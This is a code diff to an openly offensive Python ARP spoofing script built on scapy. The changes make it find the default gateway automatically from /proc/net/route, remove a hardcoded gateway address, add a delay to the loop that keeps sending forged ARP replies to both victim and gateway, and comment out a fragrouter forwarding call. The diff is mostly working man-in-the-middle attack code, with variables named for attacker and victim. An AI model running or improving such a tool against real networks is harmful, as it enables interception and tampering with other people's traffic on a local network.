@@ -6,6 +6,7 @@ from scapy.all import*
 from uuid import getnode as get_mac
 import codecs
 import struct
+import time
 
 def trans_ip(addr):
     print(type(addr))
@@ -20,6 +21,16 @@ def trans_ip(addr):
     addr=''.join(addr)
     print(addr)
     return addr
+
+def get_default_gateway_linux():
+    """Read the default gateway directly from /proc."""
+    with open("/proc/net/route") as fh:
+        for line in fh:
+            fields = line.strip().split()
+            if fields[1] != '00000000' or not int(fields[3], 16) & 2:
+                continue
+
+            return socket.inet_ntoa(struct.pack("<L", int(fields[2], 16)))
 
 def trans_mac(mac):
 	mac=mac.split(':')
@@ -100,8 +111,7 @@ if __name__ == '__main__':
 	attackerIP=get_ipaddress()
 	print(attackerIP)
 
-	gatewayIP= attackerIP[:-1]+str(1)
-	gatewayIP= ("192.168.123.1")
+	gatewayIP= get_default_gateway_linux()
 	print(gatewayIP)
 
 	gateway_mac= macadd(gatewayIP)
@@ -113,15 +123,16 @@ if __name__ == '__main__':
 	victim_mac= macadd(victimIP)
 	print(victim_mac)
 
-
 	attackerMac=get_mac()
 	attackerMac=':'.join(("%012X" %attackerMac)[i:i + 2] for i in range(0,12,2))
 	print(attackerMac)
 
 	print("ARP spoofing start")
 
-	os.system("fragrouter -B1")
 
 	while True:
 		socketsend(attackerMac,gatewayIP,victimIP,victim_mac)
 		socketsend(attackerMac, victimIP, gatewayIP, gateway_mac)
+		time.sleep(5)
+
+	#os.system("fragrouter -B1")
